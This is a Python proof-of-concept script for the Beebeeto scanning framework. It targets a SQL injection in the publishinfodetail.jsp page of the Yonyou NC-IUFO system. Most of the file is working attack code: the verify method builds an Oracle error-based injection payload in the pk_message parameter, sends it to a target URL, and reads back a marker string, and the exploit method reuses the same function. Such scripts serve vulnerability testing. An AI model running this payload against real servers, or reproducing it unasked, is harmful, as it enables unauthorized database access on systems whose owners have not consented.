#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0075',
            'name': '用友NC-IUFO系统 /epp/detail/publishinfodetail.jsp SQL注入漏洞 POC',
            'author': 'ca2fux1n',
            'create_date': '2015-03-31',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '用友NC-IUFO',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['用友NC-IUFO漏洞', '/epp/detail/publishinfodetail.jsp', 'SQL Injection', 'JSP'],
            'desc': 'param `pk_message` is not filterd',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-089208'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        url = url if url[-1] != '/' else url[:-1]
        payload = ("/epp/detail/publishinfodetail.jsp?pk_message=1002F410000000019JNX%27%20"
                   "AND%203814=(SELECT%20UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(99)||"
                   "CHR(122)||CHR(103)||CHR(113)||(SELECT%20(CASE%20WHEN%20(3814=3814)%20THEN"
                   "%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(113)||CHR(110)||CHR(111)||CHR(105)"
                   "||CHR(113)||CHR(62)))%20FROM%20DUAL)%20AND%20%27vdoA%27=%27vdoA")
        verify_url = url + payload
        if args['options']['verbose']:
            print '[*] Request URL: %s' % verify_url
        req = requests.get(verify_url)
        content = req.content
        if req.status_code == 500 and 'qczgq1qnoiq' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())